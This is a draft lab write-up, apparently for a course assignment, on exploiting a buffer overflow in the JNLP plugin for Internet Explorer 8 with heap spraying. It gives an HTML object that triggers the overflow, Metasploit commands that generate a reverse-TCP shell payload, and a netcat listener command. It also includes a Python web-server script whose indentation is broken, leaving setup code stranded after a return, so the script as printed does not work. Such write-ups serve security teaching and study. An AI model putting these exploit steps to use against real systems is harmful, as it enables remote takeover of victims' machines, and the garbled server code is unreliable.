# Exploiting a Buffer Overflow Vulnerability in the JNLP plugin within Internet Explorer 8 with using the Heap Spraying Technique

**This is still a draft**

JNLP (Java Network Launch Protocol) enables an application to be launched on a client desktop using resources that are hosted on a remote server. A specific version of JNLP for IE8 is vulnerable to a stack-based buffer overflow: when the plugin is invoked with a *launchjnlp* parameter, it will copy the value of the *docbase* parameter to a stack buffer using `sprintf`, but fails to check the length of the value. 

The vulnerability can be triggered by the following:
```html
<object type='application/x-java-applet'>
<param name='launchjnlp' value='1'>
<param name='docbase' value='AAAAAAAA....AAAAAA'>
</object>
```

## Goal
Input a sufficiently long string in the docbase value such that the register $eip gets ovewritten with an address known to contain our NOP sled and shellcode. Said shellcode establishes a reverse TCP connection to another machine.

## How it's done

To demonstrate this vulnerability, a simple web server is set up to listen on port 8080. This web server shows the contents of a specific directory in which the html file (containing the exploit) is located. The html file is clicked from the client and nothing appears to happen, but the truth is that the heap is sprayed with a shellcode! It is not until the client clicks on *Click Me* that at least one the shellcodes in the heap gets executed. This shellcode consists of several NOP operations and a reversed TCP connection to a chosen IP and port. The port used is *6666*, and to simplifly the assignment's grading, the chosen IP is 127.0.0.1, which means that the command prompt will be obtained in the client instead of in the attacker's machine (or Kali, in this case).

## Specifics

1. Two machines are used to demonstrate this vulnerability. A Windows 7 VM (with DEP disabled) acts as the client, and a Kali Linux VM acts as the web server.

2. A Windows shellcode is generated with Metasploit, which is a tool already installed in Kali Linux. The instructions in this shellcode create a reverse TCP connection from said Windows machine to a chosen IP and port. In other words, these instructions would spawn the victim's command prompt in the attacker's machine; but for practicality, the IP chosen as the attacker's IP does not belong to the attacker and it is the victim's machine, 127.0.0.1. Using the attacker's IP will make the demo realistic, but it will not make it easy to the grader of this assignment.

The shellcode is generated as follows:

`msfconsole`

`use payload/windows/shell_reverse_tcp`

`set LHOST 127.0.0.1`

`set LPORT 6666`

`generate -t js_le`

In the last command, **js_le** was used because a JavaScript shellcode is needed and the Windows machine that is targeted uses Little Endian (le).

3. To accept this reverse TCP connection in Windows, the following netcat command is needed:

`nc -l -p 6666`

**-l** specifies that nc should listen for an incoming connection, and **-p** specifies the source port.

4. Windows debugger, WinDBG, is helpful to visualize the stack and heap contents and gather information for the exploit.

5. The script that sets up a web server is provided, and it looks like this:

```python
#!/usr/bin/python
#
# Python Web Server
# Serves only static files
#
# by Saumil Shah

import sys
import BaseHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

port = 8080

class HandlerClass(SimpleHTTPRequestHandler):
        # Disable DNS lookups
        def address_string(self):
                    return str(self.client_address[0])
                    ServerClass = BaseHTTPServer.HTTPServer
                    Protocol = "HTTP/1.0"
                    server_address = ('0.0.0.0', port)
                    HandlerClass.protocol_version = Protocol
                    httpd = ServerClass(server_address, HandlerClass)
    try:
        sa = httpd.socket.getsockname()
        print "Serving HTTP on", sa[0], "port", sa[1], "..."
        httpd.serve_forever()
    except KeyboardInterrupt:
        print 'Shutting down the web server'
        httpd.socket.close()
```

6. To use the heap spraying technique, a string that follows the pattern "NOP Sled + Shellcode" is created in JavaScript. This string is successfully sprayed in the heap to occupy hundreds of megabytes. 
